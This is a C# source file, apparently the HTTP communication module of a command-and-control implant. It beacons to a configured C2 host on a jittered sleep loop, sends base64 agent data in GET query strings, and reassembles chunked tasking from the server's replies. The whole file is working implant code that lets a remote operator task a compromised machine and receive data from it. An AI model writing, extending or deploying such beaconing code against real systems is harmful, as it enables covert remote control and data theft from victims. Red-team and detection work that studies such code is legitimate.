using System;
using System.Net;
using System.Text;
using System.Threading;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Text.RegularExpressions;

using Agent.Models;
using Agent.Interfaces;
using Agent.Controllers;

using C2.Models;
using System.Linq;

namespace Agent.Modules
{
    internal class HTTPCommModule : ICommModule
    {
        protected ConfigController ConfigController { get; set; }
        protected AgentStatus AgentStatus { get; set; }

        protected Socket socket;
        protected Queue<AgentMessage> inboundQueue = new Queue<AgentMessage>();
        protected Queue<AgentMessage> outboundQueue = new Queue<AgentMessage>();
        protected byte[] cache;

        public void Initialise(ConfigController ConfigController)
        {
            this.ConfigController = ConfigController;
        }

        public void Run()
        {
            AgentStatus = AgentStatus.Running;

            Task.Factory.StartNew(delegate()
            {
                while (AgentStatus == AgentStatus.Running)
                {
                    var sleep = (int)ConfigController.GetOption(ConfigurationSettings.SleepTime) * 1000;
                    var jitter = (int)ConfigController.GetOption(ConfigurationSettings.Jitter);
                    var rnd = new Random();
                    var diff = rnd.Next((int)Math.Round(sleep * (jitter / 100.00)));
                    if (rnd.Next(2) == 0) { diff = -diff; }
                    Thread.Sleep(sleep + diff);
                    DoStuff();
                }
            });
        }

        public void SendData(AgentMessage message)
        {
            outboundQueue.Enqueue(message);
        }

        public bool RecvData(out AgentMessage message)
        {
            if (inboundQueue.Count > 0)
            {
                message = inboundQueue.Dequeue();
                return true;
            }

            message = null;
            return false;
        }

        public void Stop()
        {
            AgentStatus = AgentStatus.Stopped;
        }

        private void DoStuff()
        {
            AgentMessage message;

            if (outboundQueue.Count > 0)
                message = outboundQueue.Dequeue();
            else
            {
                // send NOP
                var c2Data = new C2Data() { Module = "Core", Command = "NOP", AgentId = (string)ConfigController.GetOption(ConfigurationSettings.AgentId) };
                message = new AgentMessage { AgentId = (string)ConfigController.GetOption(ConfigurationSettings.AgentId), Data = Convert.ToBase64String(C2.Helpers.Serialise(c2Data)) };
            }

            // Send C2Data to HTTP Server
            socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);
            var buffer = new byte[socket.ReceiveBufferSize];
            try
            {
                socket.Connect(new IPEndPoint(IPAddress.Parse((string)ConfigController.GetOption(ConfigurationSettings.C2Host)), (int)ConfigController.GetOption(ConfigurationSettings.C2Port)));
                socket.Send(Encoding.ASCII.GetBytes(string.Format("GET /?id={0}&data={1} HTTP/1.1\r\n\r\n", message.AgentId, message.Data)));
                socket.Receive(buffer);
                socket.Close();
            }
            catch { return; }
            
            // Parse the response from the HTTP request into a C2Data object
            var match = Regex.Match(Encoding.ASCII.GetString(buffer), "id=([^&]+)&data=([^&]+)&final=([^\\s\0]+)", RegexOptions.Multiline);
            if (match.Success)
            {
                var messageIn = new AgentMessage
                {
                    AgentId = match.Groups[1].Value,
                    Data = match.Groups[2].Value
                };

                var data = Convert.FromBase64String(messageIn.Data);
                if (cache == null)
                {
                    cache = data;
                }
                else
                {
                    cache = cache.Concat(data).ToArray();
                }

                if (match.Groups[3].Value.Equals("true", StringComparison.OrdinalIgnoreCase))
                {
                    messageIn.Data = Convert.ToBase64String(cache);
                    inboundQueue.Enqueue(messageIn);
                    cache = null;
                }
            }
        }
    }
}